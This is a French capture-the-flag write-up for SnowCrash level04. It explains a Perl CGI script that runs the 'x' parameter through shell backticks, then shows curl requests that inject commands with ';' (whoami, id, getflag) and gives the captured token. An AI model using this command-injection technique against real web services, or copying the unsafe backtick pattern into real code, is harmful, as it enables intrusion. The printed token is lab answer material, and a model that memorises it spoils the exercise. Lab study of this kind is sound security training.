# level04

1) Information trouvée dans `/home/level04/` :

```bash
./level04.pl
```

2) Analyse du fichier

Le script est un petit CGI/Perl vulnérable qui exécute le contenu du paramètre `x` via des backticks shell :

```perl
use CGI qw{param};
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
La valeur fournie par un visiteur est passée au shell et exécutée.

- confirmer qu'un service écoute sur le port 4747
```bash
level04@SnowCrash:~$ ss -tlnp | grep 4747
LISTEN 0 128 :::4747 :::*     
```
- vérifier sous quel user la commande s'exécutera (test rapide)
```bash
level04@SnowCrash:~$ curl -s 'http://127.0.0.1:4747/?x=%3B+whoami'
flag04
level04@SnowCrash:~$ curl -s 'http://127.0.0.1:4747/?x=%3B+id'
uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
```

Les réponses confirment que le script est actif et exécutera toute commande passée via le paramètre `x`.

4) Exploitation pour récupérer le token :

Le payload consiste à séparer la commande `echo` initiale de la commande malveillante par un `;` et à appeler `getflag` :

```bash
curl 'http://127.0.0.1:4747/?x=%3B+getflag'
```

4) Token découvert :

le token est `ne2searoevaevoem4ov4ar8ap`
